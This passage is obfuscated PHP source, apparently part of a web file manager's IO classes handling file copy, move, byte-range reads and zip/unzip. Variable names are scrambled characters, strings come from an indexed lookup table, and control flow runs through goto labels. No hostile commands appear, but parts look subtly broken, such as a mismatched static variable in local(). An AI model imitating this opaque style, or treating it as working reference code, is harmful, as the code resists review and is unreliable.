array_merge($dÜ—¨˜ğŞõ[$fƒ§¯Ìé¸[84]], $dÜ—¨˜ğŞõ[$fƒ§¯Ìé¸[85]]); foreach ($E’Œ±îŸ as $c¤¹—Ùœèª) { $F¸‹¡´¬±˜ = $c¤¹—Ùœèª[$fƒ§¯Ìé¸[39]] == $fƒ§¯Ìé¸[203]; $A„“ÆğæìÇ = $E»ò¦Êª©†->getPathInner($c¤¹—Ùœèª[$fƒ§¯Ìé¸[86]]); $AÂ÷“¡Šë = self::copyPath($E»ò¦Êª©†, $A„“ÆğæìÇ, $d‹¨¼ĞóÑ, $E—ÅÏîß¹Î, $aÏÇ›ÕõÃº, $f•¾ºÍ¸•¾, $F¸‹¡´¬±˜); if (!$AÂ÷“¡Šë) { IO::errorTips($fƒ§¯Ìé¸[1073] . $A„“ÆğæìÇ . $fƒ§¯Ìé¸[77] . $E—ÅÏîß¹Î); } } goto f™¿„‘¾ä; f™¿„‘¾ä: self::copyMoveKeepInfo($E»ò¦Êª©†, $A„“ÆğæìÇ, $fŠ¾Ë™èÇ); return $fŠ¾Ë™èÇ; goto F—´ğ’¢Á¦; F—´ğ’¢Á¦: } private static function copyFile($EÙ‡óİÕœÈ, $f‘“Ü¬ë×ù, $dœÚŞš—Ø, $D‚¤ ¬÷”, $d‡ö‘ø­¬£, $c‘’Å‡‹Ë‰) { goto D‘„öæ’À; CÙËñ¾àà½: $cÌîĞ†×… = $EÙ‡óİÕœÈ->download($f‘“Ü¬ë×ù, $cÌîĞ†×…); $cÌîĞ†×… = $EÙ‡óİÕœÈ->iconvApp($cÌîĞ†×…); $fàç¼‚«àÇ = $dœÚŞš—Ø->upload($D‚¤ ¬÷”, $cÌîĞ†×…, $c‘’Å‡‹Ë‰); goto AŸõôãƒÖ; Dœô—¤—×œ: if ($GLOBALS[$aØ¡â®Ëœ[6]][$aØ¡â®Ëœ[98]][$aØ¡â®Ëœ[792]]) { $cîÂ±´†ïª = $GLOBALS[$aØ¡â®Ëœ[6]][$aØ¡â®Ëœ[98]][$aØ¡â®Ëœ[792]]; } $c‘’Å‡‹Ë‰ = !0; $aö¿¸åáÁ÷ = $cîÂ±´†ïª; goto DõË¿ëøÑï; A„«ƒ’Í–: Hook::trigger($aØ¡â®Ëœ[1075], $EÙ‡óİÕœÈ, $f‘“Ü¬ë×ù, $dœÚŞš—Ø, $D‚¤ ¬÷”, $d‡ö‘ø­¬£, $cÖÑ®ÎÅë™); if (self::driverIsSame($EÙ‡óİÕœÈ, $dœÚŞš—Ø)) { if ($c‘’Å‡‹Ë‰) { $fàç¼‚«àÇ = $dœÚŞš—Ø->moveFile($f‘“Ü¬ë×ù, $D‚¤ ¬÷”); } else { $fàç¼‚«àÇ = $dœÚŞš—Ø->copyFile($f‘“Ü¬ë×ù, $D‚¤ ¬÷”); } Hook::trigger($aØ¡â®Ëœ[1076], $EÙ‡óİÕœÈ, $f‘“Ü¬ë×ù, $dœÚŞš—Ø, $D‚¤ ¬÷”, $d‡ö‘ø­¬£, $fàç¼‚«àÇ); self::copyMoveKeepInfo($EÙ‡óİÕœÈ, $f‘“Ü¬ë×ù, $fàç¼‚«àÇ); return $fàç¼‚«àÇ; } $cîÂ±´†ïª = TEMP_FILES; goto Dœô—¤—×œ; DõË¿ëøÑï: mk_dir($aö¿¸åáÁ÷); $cÌîĞ†×… = $aö¿¸åáÁ÷ . $cÖÑ®ÎÅë™; $b˜˜ò¾Œï = $cÌîĞ†×…; goto CÙËñ¾àà½; Bä•Æ“¾Ú: return $fàç¼‚«àÇ; goto dî—ƒ†ÔùÇ; AŸõôãƒÖ: self::remove($b˜˜ò¾Œï); Hook::trigger($aØ¡â®Ëœ[1076], $EÙ‡óİÕœÈ, $f‘“Ü¬ë×ù, $dœÚŞš—Ø, $D‚¤ ¬÷”, $d‡ö‘ø­¬£, $fàç¼‚«àÇ); self::copyMoveKeepInfo($EÙ‡óİÕœÈ, $f‘“Ü¬ë×ù, $fàç¼‚«àÇ); goto Bä•Æ“¾Ú; D‘„öæ’À: $aØ¡â®Ëœ =& $_SERVER[œÕÊİğö]; $D‚¤ ¬÷” = $dœÚŞš—Ø->getPath(rtrim($D‚¤ ¬÷”, $aØ¡â®Ëœ[8]) . $aØ¡â®Ëœ[8] . $d‡ö‘ø­¬£); $cÖÑ®ÎÅë™ = $aØ¡â®Ëœ[1074] . time() . rand_string(5); goto A„«ƒ’Í–; dî—ƒ†ÔùÇ: } private static function copyMoveKeepInfo($DÓÚìÑ¤ÎŸ, $FƒºøĞ…Ã§, $E†Êê¦¯†) { if (!$E†Êê¦¯†) { return; } $f•º°ä»ï = $DÓÚìÑ¤ÎŸ->info($FƒºøĞ…Ã§); if (!is_array($f•º°ä»ï)) { return; } IO::setModifyTime($E†Êê¦¯†, $f•º°ä»ï[$_SERVER[œÕÊİğö][94]]); } public static function pathFather($D½Ïá–²ˆ) { $BÜÏŞƒ‡Ç = IO::init($D½Ïá–²ˆ); $aÓÁ÷–Ëãª = $BÜÏŞƒ‡Ç->pathFather($BÜÏŞƒ‡Ç->path); return $BÜÏŞƒ‡Ç->getPathOuter($aÓÁ÷–Ëãª); } public static function fileOut($fÁŒëËê, $FëË¥îù¨á = false, $cÄêÒ÷èå = false, $B‹”•±…´µ = '') { $a©öÃ•ÓŞ = self::driverMake($fÁŒëËê); if ($a©öÃ•ÓŞ->isFileOutServer()) { return $a©öÃ•ÓŞ->fileOutServer($fÁŒëËê, $FëË¥îù¨á, $cÄêÒ÷èå, $B‹”•±…´µ); } return $a©öÃ•ÓŞ->fileOut($fÁŒëËê, $FëË¥îù¨á, $cÄêÒ÷èå, $B‹”•±…´µ); } public static function fileOutImage($aÕ§½ßã§›, $cŞî«ãáÓİ = 250) { $E§®Ÿ®ŞÂ¦ = array(250, 600, 1200, 2000, 3000, 5000); for ($DŒÙ±İìÖ = 0; $DŒÙ±İìÖ < count($E§®Ÿ®ŞÂ¦); $DŒÙ±İìÖ++) { if ($DŒÙ±İìÖ == 0 && $cŞî«ãáÓİ <= $E§®Ÿ®ŞÂ¦[$DŒÙ±İìÖ]) { $cŞî«ãáÓİ = $E§®Ÿ®ŞÂ¦[$DŒÙ±İìÖ]; break; } else { if ($cŞî«ãáÓİ > $E§®Ÿ®ŞÂ¦[$DŒÙ±İìÖ - 1] && $cŞî«ãáÓİ <= $E§®Ÿ®ŞÂ¦[$DŒÙ±İìÖ]) { $cŞî«ãáÓİ = $E§®Ÿ®ŞÂ¦[$DŒÙ±İìÖ]; break; } else { if ($DŒÙ±İìÖ == count($E§®Ÿ®ŞÂ¦) - 1 && $cŞî«ãáÓİ > $E§®Ÿ®ŞÂ¦[$DŒÙ±İìÖ]) { $cŞî«ãáÓİ = $E§®Ÿ®ŞÂ¦[$DŒÙ±İìÖ]; break; } } } } $b•´Æ­°ö² = self::driverMake($aÕ§½ßã§›); if ($b•´Æ­°ö²->isFileOutServer()) { return $b•´Æ­°ö²->fileOutImageServer($aÕ§½ßã§›, $cŞî«ãáÓİ); } return $b•´Æ­°ö²->fileOutImage($aÕ§½ßã§›, $cŞî«ãáÓİ); } private static function driverIsSame($F«›¥º¸ó, $eŞ™—’âîÆ) { goto e¸ œÛáÕÍ; e¸ œÛáÕÍ: $B–ªÚâ¨Šê =& $_SERVER[œÕÊİğö]; $Aá¥Ø­‰ = $F«›¥º¸ó->getType(); $c•¡Ê›ƒÜ¤ = $eŞ™—’âîÆ->getType(); goto c…Üßó³; c…Üßó³: if ($Aá¥Ø­‰ != $c•¡Ê›ƒÜ¤) { return !1; } if ($Aá¥Ø­‰ == $B–ªÚâ¨Šê[748]) { return !0; } if ($Aá¥Ø­‰ == $B–ªÚâ¨Šê[116]) { return !0; } goto f”¸š¤äš; f”¸š¤äš: if ($F«›¥º¸ó->pathDriver == $eŞ™—’âîÆ->pathDriver) { return !0; } return !1; goto aÜ‡˜Ì×ÒÕ; aÜ‡˜Ì×ÒÕ: } public static function copyUpdate($a¼š¯‰â÷¡, $E‘Áéì»³) { goto E ¡Ø„Á; b‰±•·»ùñ: $F„ÒàÏÊãÈ = self::_listAll($a¼š¯‰â÷¡); $aÕ¼¢„À¶š = self::_listAll($E‘Áéì»³); $BÃ±Ù´ßĞ = array(); goto d›Ã™«ˆ¬Û; d›Ã™«ˆ¬Û: $cÙŒ­êÀ° = array(); foreach ($F„ÒàÏÊãÈ as $f´ñøÆÅ«´ => $dšŠäµÏ–) { if (isset($aÕ¼¢„À¶š[$f´ñøÆÅ«´])) { if ($dšŠäµÏ–[$f©ˆ—‚Âé’[87]] == 1) { continue; } if ($aÕ¼¢„À¶š[$f´ñøÆÅ«´][$f©ˆ—‚Âé’[88]] == $dšŠäµÏ–[$f©ˆ—‚Âé’[88]]) { continue; } } if ($dšŠäµÏ–[$f©ˆ—‚Âé’[87]] == 1) { $cÙŒ­êÀ°[] = $E‘Áéì»³ . $f©ˆ—‚Âé’[8] . $f´ñøÆÅ«´; continue; } $DÑŸÃçµÉë = strstr(trim($f´ñøÆÅ«´, $f©ˆ—‚Âé’[8]), $f©ˆ—‚Âé’[8]) ? get_path_father($f´ñøÆÅ«´) : $f©ˆ—‚Âé’[43]; $BÃ±Ù´ßĞ[] = array($f©ˆ—‚Âé’[1077] => $dšŠäµÏ–[$f©ˆ—‚Âé’[86]], $f©ˆ—‚Âé’[1078] => rtrim($E‘Áéì»³, $f©ˆ—‚Âé’[8]) . $f©ˆ—‚Âé’[8] . $DÑŸÃçµÉë, $f©ˆ—‚Âé’[1079] => $dšŠäµÏ–); } $E½‚¥ …‡å = array($f©ˆ—‚Âé’[203] => $BÃ±Ù´ßĞ, $f©ˆ—‚Âé’[87] => $cÙŒ­êÀ°); goto f§Íò¹áÓ; E ¡Ø„Á: $f©ˆ—‚Âé’ =& $_SERVER[œÕÊİğö]; if (!IO::exist($a¼š¯‰â÷¡)) { return !1; } if (!IO::exist($E‘Áéì»³)) { IO::mkdir($E‘Áéì»³); } goto b‰±•·»ùñ; f§Íò¹áÓ: Hook::trigger($f©ˆ—‚Âé’[1080], $a¼š¯‰â÷¡, $E‘Áéì»³, $E½‚¥ …‡å); foreach ($cÙŒ­êÀ° as $dšŠäµÏ–) { IO::mkdir($dšŠäµÏ–); } foreach ($BÃ±Ù´ßĞ as $dšŠäµÏ–) { IO::copy($dšŠäµÏ–[$f©ˆ—‚Âé’[1077]], $dšŠäµÏ–[$f©ˆ—‚Âé’[1078]], REPEAT_REPLACE); } goto FÆÙòš…ƒÎ; FÆÙòš…ƒÎ: } private static function _listAll($Bâäº‹‰•ù) { $e‰®‚¬‡ˆ„ =& $_SERVER[œÕÊİğö]; $Bâäº‹‰•ù = KodIO::clear($Bâäº‹‰•ù); $aÁÑƒÛ‡Ó„ = IO::listAll($Bâäº‹‰•ù); foreach ($aÁÑƒÛ‡Ó„ as &$F‘ÌŠœÓë) { $bÑ¬Ç°Ë„Ù = substr($F‘ÌŠœÓë[$e‰®‚¬‡ˆ„[86]], strlen($Bâäº‹‰•ù)); $F‘ÌŠœÓë[$e‰®‚¬‡ˆ„[1081]] = trim($bÑ¬Ç°Ë„Ù, $e‰®‚¬‡ˆ„[8]); } unset($F‘ÌŠœÓë); return array_to_keyvalue($aÁÑƒÛ‡Ó„, $e‰®‚¬‡ˆ„[1081]); } public static function fileSubstr($c‚ƒ«‰ÁÆ³, $b°½¨¸ƒ£÷, $eë¯ˆùµÔÚ = false) { goto AÃáÑ—òˆ”; CĞ³‚‘ˆ‚†: $c´ÅåÛ©Ÿ = $b°½¨¸ƒ£÷; $aå·Ò¬‡Éö = $eë¯ˆùµÔÚ; if ($b°½¨¸ƒ£÷ < 0) { $b°½¨¸ƒ£÷ = $cŠ…ëÌÊ + $b°½¨¸ƒ£÷; } goto eà¹Á‹İ£; C‡¼øóá•Ô: if ($eë¯ˆùµÔÚ <= 0) { return $D½šêºº¦ß[43]; } if ($b°½¨¸ƒ£÷ < 0 || $b°½¨¸ƒ£÷ >= $cŠ…ëÌÊ || $eë¯ˆùµÔÚ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\x52\x65\x61\144\40\145\162\162\157\162\41\x20\163\164\x61\x72\x74\x3d{$b°½¨¸ƒ£÷}\73\x6c\x65\x6e\x67\x74\x68\x3d{$eë¯ˆùµÔÚ}\x3b\40\163\x69\172\145\75{$cŠ…ëÌÊ}\x3b"); } $FŠ½ª„åõ½ = $DÒÓŸ…„†->fileSubstr($c‚ƒ«‰ÁÆ³, $b°½¨¸ƒ£÷, $eë¯ˆùµÔÚ); goto C·µŞ«Ï®Ş; AÃáÑ—òˆ”: $D½šêºº¦ß =& $_SERVER[œÕÊİğö]; $DÒÓŸ…„† = self::driverMake($c‚ƒ«‰ÁÆ³); $cŠ…ëÌÊ = $DÒÓŸ…„†->size($c‚ƒ«‰ÁÆ³); goto CĞ³‚‘ˆ‚†; eà¹Á‹İ£: if ($eë¯ˆùµÔÚ === !1) { $eë¯ˆùµÔÚ = $cŠ…ëÌÊ - $b°½¨¸ƒ£÷; } if ($b°½¨¸ƒ£÷ + $eë¯ˆùµÔÚ > $cŠ…ëÌÊ) { $eë¯ˆùµÔÚ = $cŠ…ëÌÊ - $b°½¨¸ƒ£÷; } if (!$cŠ…ëÌÊ && $DÒÓŸ…„†->getType() == $D½šêºº¦ß[116] && !$DÒÓŸ…„†->exist($c‚ƒ«‰ÁÆ³)) { throw new Exception($D½šêºº¦ß[1082] . LNG($D½šêºº¦ß[1083]) . $D½šêºº¦ß[948] . get_path_this($c‚ƒ«‰ÁÆ³) . $D½šêºº¦ß[43]); } goto C‡¼øóá•Ô; C·µŞ«Ï®Ş: if (!$FŠ½ª„åõ½ && $eë¯ˆùµÔÚ && isset($GLOBALS[$D½šêºº¦ß[1084]])) { throw new Exception($GLOBALS[$D½šêºº¦ß[1084]][$D½šêºº¦ß[1085]]); } return $FŠ½ª„åõ½; goto cêµ´ÄÇ’Ô; cêµ´ÄÇ’Ô: } private static function driverMake(&$d»Æ¹˜†¡Á) { goto aê—Ø‰ÒÖÄ; A¤–ÍÇ’Ó: return $d™•—´«; goto B¹‰×‘óƒ; aê—Ø‰ÒÖÄ: $BÃË¤ŸÔ„¤ =& $_SERVER[œÕÊİğö]; $c¹òÍÓó†¨ = KodIO::parse($d»Æ¹˜†¡Á); if (!self::$driverListSystem) { $Dß›œÅö©Á = Model($BÃË¤ŸÔ„¤[757])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Dß›œÅö©Á, $BÃË¤ŸÔ„¤[404]); } goto b±åÒ÷é£´; b±åÒ÷é£´: if ($c¹òÍÓó†¨[$BÃË¤ŸÔ„¤[39]] == KodIO::KOD_IO && !self::$driverListSystem[$c¹òÍÓó†¨[$BÃË¤ŸÔ„¤[404]]]) { return !1; } $d»Æ¹˜†¡Á = $c¹òÍÓó†¨[$BÃË¤ŸÔ„¤[1086]]; $d™•—´« = self::driverGet($c¹òÍÓó†¨, $d»Æ¹˜†¡Á); goto A¤–ÍÇ’Ó; B¹‰×‘óƒ: } private static function driverGet($c¨¦¦–ÖÀ‰, &$CµÍ ®ğÏô) { goto C‰çîÜƒÜ‚; B´¶ÔêÕÚ: switch ($c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[39]]) { case KodIO::KOD_IO: $EòÑŒòÍÜ = self::$driverListSystem[$bÈŞĞº¡‚×]; break; case KodIO::KOD_SOURCE: $CµÍ ®ğÏô = $bÈŞĞº¡‚× . $CµÍ ®ğÏô; $EòÑŒòÍÜ = array($CÕö‹‰ÊÛš[1088] => $CÕö‹‰ÊÛš[1089], $CÕö‹‰ÊÛš[6] => $c¨¦¦–ÖÀ‰); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $FŠ®Şè½ºé = $GLOBALS[$CÕö‹‰ÊÛš[1090]]; self::$driverListUser = array_to_keyvalue($FŠ®Şè½ºé, $CÕö‹‰ÊÛš[404]); } $EòÑŒòÍÜ = self::$driverListUser[$bÈŞĞº¡‚×]; break; case KodIO::KOD_SHARE_LINK: $EòÑŒòÍÜ = array($CÕö‹‰ÊÛš[1088] => $CÕö‹‰ÊÛš[1091], $CÕö‹‰ÊÛš[6] => $c¨¦¦–ÖÀ‰); $bßİÙëŞÍÃ = Action($CÕö‹‰ÊÛš[1092])->sharePathInfo($c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[86]]); $CµÍ ®ğÏô = $bßİÙëŞÍÃ[$CÕö‹‰ÊÛš[406]]; if (!$bßİÙëŞÍÃ[$CÕö‹‰ÊÛš[406]]) { $bâöÎìÜ÷æ = Model($CÕö‹‰ÊÛš[598])->getInfo($bßİÙëŞÍÃ[$CÕö‹‰ÊÛš[491]]); $CµÍ ®ğÏô = KodIO::clear($bâöÎìÜ÷æ[$CÕö‹‰ÊÛš[1093]] . $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[1086]]); $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[489]] = $bâöÎìÜ÷æ; $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[1070]] = $CµÍ ®ğÏô; $EòÑŒòÍÜ = array($CÕö‹‰ÊÛš[1088] => $CÕö‹‰ÊÛš[1094], $CÕö‹‰ÊÛš[6] => $c¨¦¦–ÖÀ‰); } break; case KodIO::KOD_SHARE_ITEM: $EòÑŒòÍÜ = array($CÕö‹‰ÊÛš[1088] => $CÕö‹‰ÊÛš[1095], $CÕö‹‰ÊÛš[6] => $c¨¦¦–ÖÀ‰); $bâöÎìÜ÷æ = Model($CÕö‹‰ÊÛš[598])->getInfo($c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[404]]); if ($bâöÎìÜ÷æ[$CÕö‹‰ÊÛš[406]] == $CÕö‹‰ÊÛš[201]) { $CµÍ ®ğÏô = KodIO::clear($bâöÎìÜ÷æ[$CÕö‹‰ÊÛš[1093]] . $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[1086]]); $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[489]] = $bâöÎìÜ÷æ; $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[1070]] = $CµÍ ®ğÏô; $EòÑŒòÍÜ = array($CÕö‹‰ÊÛš[1088] => $CÕö‹‰ÊÛš[1096], $CÕö‹‰ÊÛš[6] => $c¨¦¦–ÖÀ‰); } else { if (!$CµÍ ®ğÏô) { $CµÍ ®ğÏô = $bâöÎìÜ÷æ[$CÕö‹‰ÊÛš[406]]; } } break; default: $CµÍ ®ğÏô = $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[86]]; $EòÑŒòÍÜ = array($CÕö‹‰ÊÛš[1088] => $CÕö‹‰ÊÛš[1097]); break; } $DßÁÕàÛ‚° = $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[86]]; if (!isset(self::$driverCache[$DßÁÕàÛ‚°])) { $CåÖêÄá“Ï = strtolower($EòÑŒòÍÜ[$CÕö‹‰ÊÛš[104]]); $A± ¿ÑÅõŞ = $GLOBALS[$CÕö‹‰ÊÛš[6]][$CÕö‹‰ÊÛš[98]][$CÕö‹‰ÊÛš[823]]; $DÓ±‹ŒÁš = $CÕö‹‰ÊÛš[82] . (isset($A± ¿ÑÅõŞ[$CåÖêÄá“Ï]) ? $A± ¿ÑÅõŞ[$CåÖêÄá“Ï] : ucfirst($CåÖêÄá“Ï)); if (!class_exists($DÓ±‹ŒÁš)) { show_json("{$DÓ±‹ŒÁš}\x20\156\x6f\x74\x20\x65\x78\x69\163\164\163\x21", !1); } $EµÊ…“¬‘ = isset($EòÑŒòÍÜ[$CÕö‹‰ÊÛš[6]]) ? $EòÑŒòÍÜ[$CÕö‹‰ÊÛš[6]] : !1; self::$driverCache[$DßÁÕàÛ‚°] = new $DÓ±‹ŒÁš($EµÊ…“¬‘); } goto C÷ÜÏùìö‡; C÷ÜÏùìö‡: $E£’äˆßçË = self::$driverCache[$DßÁÕàÛ‚°]; $E£’äˆßçË->pathDriver = $b÷Œ¤›´İ; $E£’äˆßçË->pathBase = $CÕö‹‰ÊÛš[43]; goto eªÖ›®‚Ñ; eªÖ›®‚Ñ: if (isset($EòÑŒòÍÜ[$CÕö‹‰ÊÛš[6]][$CÕö‹‰ÊÛš[1098]])) { $E£’äˆßçË->pathBase = rtrim($EòÑŒòÍÜ[$CÕö‹‰ÊÛš[6]][$CÕö‹‰ÊÛš[1098]], $CÕö‹‰ÊÛš[8]) . $CÕö‹‰ÊÛš[8]; $CµÍ ®ğÏô = $E£’äˆßçË->pathBase . ltrim($CµÍ ®ğÏô, $CÕö‹‰ÊÛš[8]); } $CµÍ ®ğÏô = $E£’äˆßçË->getPath($CµÍ ®ğÏô); if (isset($c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[1070]])) { $CµÍ ®ğÏô = $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[1070]]; } goto a© ¼œÙŸ; C‰çîÜƒÜ‚: $CÕö‹‰ÊÛš =& $_SERVER[œÕÊİğö]; $b÷Œ¤›´İ = $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[1087]]; $bÈŞĞº¡‚× = $c¨¦¦–ÖÀ‰[$CÕö‹‰ÊÛš[404]]; goto B´¶ÔêÕÚ; a© ¼œÙŸ: $E£’äˆßçË->path = $CµÍ ®ğÏô; return $E£’äˆßçË; goto DãÔààÔâÎ; DãÔààÔâÎ: } public static function errorTips($b„¢Ÿ´‡ç = false) { goto E¾…çòÃİ; b‰²³«ÅŞ: $F¥Éìªó˜…[] = $b„¢Ÿ´‡ç; write_log($b— £­îó[170] . ACTION . $b— £­îó[1099] . $b„¢Ÿ´‡ç, $b— £­îó[1100]); goto bÏ‚•Ú¾‹; báå™ƒÀø²: if ($b„¢Ÿ´‡ç === -1) { return $F¥Éìªó˜… ? $F¥Éìªó˜…[count($F¥Éìªó˜…) - 1] : $b— £­îó[43]; } if ($b„¢Ÿ´‡ç === !1) { return implode($b— £­îó[15], $F¥Éìªó˜…); } if (count($F¥Éìªó˜…) >= $BŠµ÷ë‹™’) { $F¥Éìªó˜… = array_slice($F¥Éìªó˜…, $BŠµ÷ë‹™’ * 0.5, $BŠµ÷ë‹™’); } goto b‰²³«ÅŞ; E¾…çòÃİ: $b— £­îó =& $_SERVER[œÕÊİğö]; static $F¥Éìªó˜… = array(); $BŠµ÷ë‹™’ = 1000; goto báå™ƒÀø²; bÏ‚•Ú¾‹: } public static function getLastError($aÍ§İŒ…ì = '') { $c¤˜©¤ìöÇ = self::errorTips(-1); return $c¤˜©¤ìöÇ ? $c¤˜©¤ìöÇ : $aÍ§İŒ…ì; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $aƒì¬ùØß; if (!$aƒì¬ùØß) { $DáãîÆ» = IO::init($_SERVER[œÕÊİğö][8]); } return $DáãîÆ»; } private static function iconvSystem($DÃî§ÄöÖĞ) { return self::local()->iconvSystem($DÃî§ÄöÖĞ); } private static function iconvApp($cˆÈÏ‹ìñ…) { return self::local()->iconvApp($cˆÈÏ‹ìñ…); } public static function zip($EÊğÒö—ÓÈ, $C¦¿•ïâÜ = "\172\151\160", $Fª¸ò‰öø“ = '', $FĞ‡–¸éµ = REPEAT_RENAME) { goto F”Ø¬Œö½; dµŠÈ¹‰¸º: if ($Fª¸ò‰öø“ || !$D•ÙäòÄôÊ) { if ($D•ÙäòÄôÊ && strstr($D•ÙäòÄôÊ, TEMP_FILES)) { $féÑğ¼ÆñÏ = $DÙŠğ©‹í = array(); recursion_dir($aƒÀÕÎö¯Ç, $féÑğ¼ÆñÏ, $DÙŠğ©‹í, 0); foreach ($féÑğ¼ÆñÏ as $BÄ¨¹õ) { del_dir($BÄ¨¹õ); } foreach ($DÙŠğ©‹í as $AİÛ—ÚŒ¸Õ) { if ($AİÛ—ÚŒ¸Õ == $cÇÒÑ‚—­¶) { continue; } del_file($AİÛ—ÚŒ¸Õ); } } return $eÏ›É‰à; } $F—©êœâöà = self::pathFather($EŒµº–±µ[$E„²–˜¿«ª[86]]); $fœ‹¶ÀÈœ = self::move($eÏ›É‰à, $F—©êœâöà, $FĞ‡–¸éµ); goto F²¼ğÊ“ªõ; FÆ¤›Ÿ…®Š: if (count($DÙŠğ©‹í) > 1) { $bËÅà¥¢‰ = IO::info(IO::pathFather($EŒµº–±µ[$E„²–˜¿«ª[86]])); $EÎËŒÛ‡Ú¦ = $bËÅà¥¢‰[$E„²–˜¿«ª[38]]; } $aƒÀÕÎö¯Ç = $D•ÙäòÄôÊ; if (!$aƒÀÕÎö¯Ç) { $aƒÀÕÎö¯Ç = get_path_father($EŒµº–±µ[$E„²–˜¿«ª[86]]); if (!$Fª¸ò‰öø“ && $A È¸Ø¢İÒ->getType() == $E„²–˜¿«ª[116]) { $aƒÀÕÎö¯Ç = get_path_father($A È¸Ø¢İÒ->path); } $EßÀ¬Ô«Õ® = IO::info($aƒÀÕÎö¯Ç); if (!$EßÀ¬Ô«Õ®[$E„²–˜¿«ª[206]]) { show_json(LNG($E„²–˜¿«ª[1102]), !1); } } goto AÛÀƒËƒ×; F”Ø¬Œö½: $E„²–˜¿«ª =& $_SERVER[œÕÊİğö]; $A È¸Ø¢İÒ = self::init($EÊğÒö—ÓÈ[0][$E„²–˜¿«ª[86]]); $EŒµº–±µ = self::info($EÊğÒö—ÓÈ[0][$E„²–˜¿«ª[86]]); goto D†¨­ï‰Ş®; F²¼ğÊ“ªõ: if (!$fœ‹¶ÀÈœ) { del_dir($D•ÙäòÄôÊ); show_json(LNG($E„²–˜¿«ª[1103]), !1); } del_dir($D•ÙäòÄôÊ); return $fœ‹¶ÀÈœ; goto Bº·¾ï†Š; AÛÀƒËƒ×: $eÏ›É‰à = $aƒÀÕÎö¯Ç . $EÎËŒÛ‡Ú¦ . $E„²–˜¿«ª[105] . $C¦¿•ïâÜ; $eÏ›É‰à = get_filename_auto($eÏ›É‰à, $E„²–˜¿«ª[43], $FĞ‡–¸éµ); $cÇÒÑ‚—­¶ = self::iconvSystem($eÏ›É‰à); goto a–ÊÌ×â’; a–ÊÌ×â’: foreach ($DÙŠğ©‹í as $aîÊ²£îä˜ => $ağ±ÔŸÆæ¦) { $DÙŠğ©‹í[$aîÊ²£îä˜] = self::iconvSystem($ağ±ÔŸÆæ¦); } KodArchive::create($cÇÒÑ‚—­¶, $DÙŠğ©‹í); if (!IO::exist($eÏ›É‰à)) { if ($D•ÙäòÄôÊ) { del_dir($D•ÙäòÄôÊ); } show_json(LNG($E„²–˜¿«ª[1103]), !1); } goto dµŠÈ¹‰¸º; D†¨­ï‰Ş®: $D•ÙäòÄôÊ = !1; if (!$Fª¸ò‰öø“ && $A È¸Ø¢İÒ->getType() == $E„²–˜¿«ª[116]) { $DÙŠğ©‹í = self::zipFileList($EÊğÒö—ÓÈ); } else { $D•ÙäòÄôÊ = $Fª¸ò‰öø“ ? $Fª¸ò‰öø“ : TEMP_FILES . $E„²–˜¿«ª[1101] . time() . rand_string(8) . $E„²–˜¿«ª[8]; mk_dir($D•ÙäòÄôÊ); $DÙŠğ©‹í = self::zipFileList($EÊğÒö—ÓÈ, $D•ÙäòÄôÊ); } $EÎËŒÛ‡Ú¦ = $EŒµº–±µ[$E„²–˜¿«ª[38]]; goto FÆ¤›Ÿ…®Š; Bº·¾ï†Š: } public static function unzip($cÖÔá‚¦Öé, $Aˆ­ØĞàùö = "\162\x65\x70\154\141\143\145") { goto DÄ‰¯ÚĞì; AšÕ õ’Ô„: return !0; goto EùÖÑ£ÂÎµ; Fß‰çëŒ: if (!($dó÷¶Áê‰ƒ = parent::info($c±ÖÍ…))) { show_json(LNG($A‰¦šò[1105]), !1); } if (!($dë–ÌóµÛö = parent::infoFull($F­Ù¢‘ƒÃ¯))) { $F­Ù¢‘ƒÃ¯ = parent::mkdir($F­Ù¢‘ƒÃ¯); $dë–ÌóµÛö = array($A‰¦šò[86] => $F­Ù¢‘ƒÃ¯); } else { if (isset($dë–ÌóµÛö[$A‰¦šò[406]]) && trim($dë–ÌóµÛö[$A‰¦šò[86]], $A‰¦šò[8]) != trim($F­Ù¢‘ƒÃ¯, $A‰¦šò[8])) { $e˜ĞÙ›ô› = KodIO::make($dë–ÌóµÛö[$A‰¦šò[501]]); $EÂÌãÊ¸„Î = parent::fileNameAuto($e˜ĞÙ›ô›, $dë–ÌóµÛö[$A‰¦šò[38]], REPEAT_RENAME_FOLDER, !0); $F­Ù¢‘ƒÃ¯ = parent::mkdir($e˜ĞÙ›ô› . $EÂÌãÊ¸„Î); $dë–ÌóµÛö = array($A‰¦šò[86] => $F­Ù¢‘ƒÃ¯); } } $F­Ù¢‘ƒÃ¯ = $dë–ÌóµÛö[$A‰¦šò[86]]; goto AÌåŠ…Şë; FÛñöÈØ“¡: $b¤ï´¤ ïå = KodArchive::extract($C†µ×èí®Ñ, $cÊÎÎÀ›áë . $A‰¦šò[8], $AÙ…»Â¯…¢); self::archiveExt(); if (!$b¤ï´¤ ïå[$A‰¦šò[1108]]) { show_json($A‰¦šò[1109] . $b¤ï´¤ ïå[$A‰¦šò[1110]], !1); } goto aßÅêÀ¡äŞ; DÄ‰¯ÚĞì: $A‰¦šò =& $_SERVER[œÕÊİğö]; $c±ÖÍ… = $cÖÔá‚¦Öé[$A‰¦šò[86]]; $F­Ù¢‘ƒÃ¯ = $cÖÔá‚¦Öé[$A‰¦šò[1104]]; goto Fß‰çëŒ; F¿ö×Âòùè: foreach ($eÎ“ó»ŠÄÀ as $c¤ùè³ËÆÜ) { $c¤ùè³ËÆÜ = self::iconvApp($c¤ùè³ËÆÜ); self::move($c¤ùè³ËÆÜ, $F­Ù¢‘ƒÃ¯, $Aˆ­ØĞàùö); } 